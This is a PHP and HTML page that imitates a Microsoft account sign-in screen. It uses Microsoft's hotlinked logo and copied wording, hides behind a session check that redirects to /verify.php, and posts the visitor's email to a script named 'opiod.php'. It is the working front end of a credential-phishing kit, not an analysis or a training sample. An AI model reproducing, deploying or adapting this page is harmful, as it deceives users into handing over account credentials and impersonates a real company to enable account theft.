<?php
session_start();

if (empty($_SESSION['verified'])) {
    header('Location: /verify.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In to your account</title>
  <link rel="icon" href="favicon.png">
  <link rel="preload"
      href="images/background.webp"
      as="image"
      fetchpriority="high">
  <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="bg"></div>

<div class="card">
  <div class="logo">
    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">
  </div>

  <form id="loginForm" action="opiod.php" method="post">
  <h1 class="si">Sign in</h1>

  <!-- <div id="emailError" style="color:#e81123; display:none; margin-bottom:8px;">
    Enter a valid email address, phone number, or Skype name.
  </div> -->
  <div id="emailError" style="display:none; margin-bottom:8px;">
    <span style="color: red;">Enter a valid email address, phone number, or Skype name.</span>
    
  </div>


  <input
  type="email"
  id="email"
  class="email-input"
  name="email"
  placeholder="Email, phone, or Skype"
  required
  autocomplete="off"
>

  <!-- <input id="email" name="email" type="email" placeholder="Email, phone, or Skype" autocomplete="off"> -->

  <p class="small">
    No account? <a href="#">Create one!</a>
  </p>

  <a class="small-link" href="#">Can’t access your account?</a>

  <div class="buttons">
    <!-- <button class="btn back">Back</button> -->
    <!-- <button class="btn next" type="submit" onclick="handleNext()">Next</button> -->
     <button class="btn next" type="submit">Next</button>
  </div>
  </form>
</div>

<div class="signin-options">
  <img src="images/passkey.png" alt=""> Sign-in options
</div>

<div class="footer">
  Terms of use &nbsp;&nbsp; Privacy & cookies
</div>

<script src="script.js"></script>
</body>
</html>
